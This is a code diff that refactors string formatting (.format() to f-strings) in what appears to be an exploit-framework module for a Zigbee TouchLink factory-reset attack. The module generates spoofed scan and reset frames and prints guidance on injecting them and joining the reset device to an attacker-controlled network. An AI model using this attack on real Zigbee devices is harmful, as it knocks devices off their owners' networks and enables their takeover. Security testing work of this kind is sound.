@@ -130,7 +130,7 @@ class Exploit(Exploit):
     def _validate_channel(self):
         ch = int(self.channel)
         if ch < 11 or ch > 26:
-            print_error("Invalid Zigbee channel: {} (must be 11-26)".format(ch))
+            print_error(f"Invalid Zigbee channel: {ch} (must be 11-26)")
             return False
         return True
 
@@ -168,7 +168,7 @@ class Exploit(Exploit):
     @multi
     def run(self):
         print_status("Zigbee TouchLink factory reset attack")
-        print_info("Target channel: {}".format(self.channel))
+        print_info(f"Target channel: {self.channel}")
 
         if not self._validate_channel():
             return
@@ -179,8 +179,8 @@ class Exploit(Exploit):
         src_eui64 = self._generate_eui64()
         tx_id = self._generate_tx_id()
 
-        print_info("Source EUI-64: {}".format(src_eui64.hex()))
-        print_info("Transaction ID: 0x{:08X}".format(tx_id))
+        print_info(f"Source EUI-64: {src_eui64.hex()}")
+        print_info(f"Transaction ID: 0x{tx_id:08X}")
 
         print_status("Phase 1: TouchLink scan across all channels...")
         scan_frames = self._simulate_scan(src_eui64, tx_id)
@@ -190,20 +190,18 @@ class Exploit(Exploit):
         for ch, frame in scan_frames:
             rows.append((str(ch), str(len(frame)), frame[:32].hex()))
         print_table(headers, *rows)
-        print_info("Generated {} scan request frames".format(len(scan_frames)))
+        print_info(f"Generated {len(scan_frames)} scan request frames")
 
-        print_status("Phase 2: Factory reset on channel {}...".format(self.channel))
+        print_status(f"Phase 2: Factory reset on channel {self.channel}...")
         reset_frames = self._simulate_reset(src_eui64, tx_id)
 
         for i, (ch, frame) in enumerate(reset_frames):
-            print_info("  Reset frame {}: channel={}, {} bytes, data={}".format(
-                i + 1, ch, len(frame), frame.hex()[:64],
-            ))
+            print_info(f"  Reset frame {i + 1}: channel={ch}, {len(frame)} bytes, data={frame.hex()[:64]}")
 
-        print_success("Factory reset frames generated ({} frames)".format(len(reset_frames)))
+        print_success(f"Factory reset frames generated ({len(reset_frames)} frames)")
         print_warning("Impact: Target device removed from Zigbee network")
         print_info("Next step: join the reset device to attacker-controlled network")
         print_info(
-            "To transmit: configure radio interface '{}' on channel {} "
-            "and inject the generated frames".format(self.interface, self.channel)
+            f"To transmit: configure radio interface '{self.interface}' on channel {self.channel} "
+            "and inject the generated frames"
         )
